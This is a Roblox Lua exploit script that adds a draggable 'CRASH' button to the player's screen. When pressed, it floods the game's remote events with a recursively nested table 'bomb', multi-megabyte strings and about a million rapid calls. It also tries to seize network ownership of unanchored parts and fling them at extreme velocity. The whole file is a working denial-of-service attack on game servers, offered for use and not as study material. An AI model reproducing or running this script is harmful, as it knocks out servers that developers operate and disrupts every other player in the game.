local player = game:GetService("Players").LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local gui = Instance.new("ScreenGui")
gui.Name = "SimpleCrashMenu"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 140, 0, 46)
frame.Position = UDim2.new(1, -160, 0.5, -23)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 10)

local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 2.5
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

task.spawn(function()
    local hue = 0
    while gui.Parent do
        hue = (hue + 0.005) % 1
        stroke.Color = Color3.fromHSV(hue, 0.85, 1)
        task.wait(0.03)
    end
end)

local button = Instance.new("TextButton")
button.Size = UDim2.new(1, -12, 1, -12)
button.Position = UDim2.new(0, 6, 0, 6)
button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
button.Text = "CRASH"
button.TextColor3 = Color3.new(1, 1, 1)
button.Font = Enum.Font.GothamBold
button.TextSize = 16
button.AutoButtonColor = false
button.Parent = frame

local btnCorner = Instance.new("UICorner", button)
btnCorner.CornerRadius = UDim.new(0, 8)

button.MouseEnter:Connect(function()
    TweenService:Create(button, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
end)
button.MouseLeave:Connect(function()
    TweenService:Create(button, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
end)

local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

button.MouseButton1Click:Connect(function()
    button.Text = "CRASHING..."
    button.TextColor3 = Color3.fromRGB(255, 100, 100)
    button.BackgroundColor3 = Color3.fromRGB(80, 10, 10)
    
    task.spawn(function()
        local DataEvents = RS:FindFirstChild("DataEvents")
        
        if not DataEvents then
            button.Text = "NO REMOTES"
            button.TextColor3 = Color3.new(1, 1, 1)
            return
        end
        
        local UpdTextures = DataEvents:FindFirstChild("UpdateTexturesChoice")
        local DataRemote = DataEvents:FindFirstChild("DataRemoteEvent")

        if UpdTextures then
            task.spawn(function()
                local function buildBomb(depth, width)
                    if depth == 0 then return string.rep("X", 500) end
                    local t = {}
                    for i = 1, width do
                        t[i] = buildBomb(depth - 1, width)
                    end
                    return t
                end
                local bomb = buildBomb(4, 8)
                for i = 1, 50 do
                    pcall(function() UpdTextures:FireServer(bomb) end)
                    pcall(function() UpdTextures:FireServer(string.rep("A", 5e6)) end)
                    task.wait(0.01)
                end
            end)
        end

        if DataRemote then
            for i = 1, 20 do
                task.spawn(function()
                    for j = 1, 50000 do
                        pcall(function() DataRemote:FireServer() end)
                    end
                end)
            end
        end

        for _, v in pairs(workspace:GetChildren()) do
            if v:IsA("BasePart") and not v.Anchored then
                pcall(function() v:SetNetworkOwner(player) end)
                v.AssemblyLinearVelocity = Vector3.new(1e5, 1e5, 1e5)
            end
        end

        task.wait(3)
        if button.Text == "CRASHING..." then
            button.Text = "DONE"
            button.TextColor3 = Color3.fromRGB(100, 255, 100)
        end
    end)
end)
